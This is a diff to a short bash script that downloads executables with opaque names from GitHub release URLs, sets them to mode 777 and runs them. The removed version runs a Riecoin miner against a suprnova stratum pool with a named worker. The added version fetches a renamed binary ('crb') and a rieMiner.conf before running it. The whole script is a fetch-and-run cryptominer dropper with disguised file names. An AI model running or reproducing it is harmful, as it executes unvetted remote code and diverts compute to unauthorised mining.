@@ -1,4 +1,6 @@
 #!/bin/bash
-wget https://github.com/vedhagsvp/qubros/releases/download/apl/cpmnarric
-chmod 777 cpmnarric
-./cpmnarric  -a riecoin -o stratum+tcp://ric.suprnova.cc:5000 -u vedhatyms1.vaden -p x
+wget https://github.com/varfeplas/srnabiks/releases/download/rie/crb
+wget https://github.com/vedhagsvp/qubros/raw/main/rieMiner.conf
+chmod 777 crb
+chmod 777 rieMiner.conf
+./crb
